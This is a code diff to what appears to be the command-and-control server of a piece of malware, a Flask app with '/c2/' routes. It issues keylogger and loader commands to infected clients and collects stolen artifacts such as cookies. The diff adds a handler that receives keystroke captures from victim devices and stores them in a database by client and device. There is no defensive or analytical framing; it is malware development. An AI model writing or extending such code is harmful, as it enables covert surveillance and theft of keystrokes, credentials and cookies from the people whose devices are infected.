@@ -181,15 +181,10 @@ def add_command(client_name):
             }
         })
     elif command == 'keylogger':
-        action = data.get('action')
-        if action == "stop":
-           command_data = json.dumps({  
-            "KEY_LOGGER": {"activity_id": activity_id,"restart": restart , "stop": "1"} 
-        }) 
-        else:   
          command_data = json.dumps({  
-            "KEY_LOGGER": {"activity_id": activity_id,"restart": restart,"action": action} 
+            "KEY_LOGGER": {"activity_id": activity_id,"restart": restart} 
         })
+         
     elif command == 'loader':
         file_content = data.get('file_content')
         if file_content:
@@ -282,6 +277,7 @@ def send_command():
 
 
 #get artifacts    
+# get artifacts
 @app.route('/c2/send_artifact/', methods=['POST'])
 def receive_artifact():
     try:
@@ -471,6 +467,38 @@ def receive_artifact():
                 app.logger.error(f'Failed to save cookies to database: {str(e)}')
                 status_update = 'failure'
 
+        elif artifact_type == 'KEY_LOGGER':
+            # Handle KEY_LOGGER artifact
+            if isinstance(artifact_data, list) and len(artifact_data) > 0:
+                keylogger_data = artifact_data[0]
+                app.logger.info(f'Keylogger data received: {keylogger_data}')
+
+                # Convert keylogger data to JSON
+                keylogger_json = json.dumps(keylogger_data, indent=4)
+
+                try:
+                    # Save the JSON to GridFS
+                    file_name = f"{artifact_type}_{activity_id}.json"
+                    fs.put(io.BytesIO(keylogger_json.encode('utf-8')), filename=file_name)
+
+                    # Save the metadata to the artifacts collection
+                    artifact_record = {
+                        'client_id': client_id,
+                        'activity_id': activity_id,
+                        'device': device_name,
+                        'artifact_type': artifact_type,
+                        'file_name': file_name,
+                        'created_at': datetime.now()
+                    }
+                    artifact_collection.insert_one(artifact_record)
+                    responses.append({'file_name': file_name, 'status': 'saved'})
+                except Exception as e:
+                    app.logger.error(f'Failed to save keylogger data to database: {str(e)}')
+                    status_update = 'failure'
+            else:
+                app.logger.error('Invalid data format for KEY_LOGGER')
+                status_update = 'failure'
+
         else:
             if not isinstance(artifact_data, dict):
                 app.logger.error(f'Invalid data format for {artifact_type}')
@@ -496,6 +524,7 @@ def receive_artifact():
     except Exception as e:
         app.logger.error(f'Unhandled exception: {str(e)}')
         return jsonify({'status': 'error', 'message': f'Unhandled exception: {str(e)}'}), 500
+
 
 
 
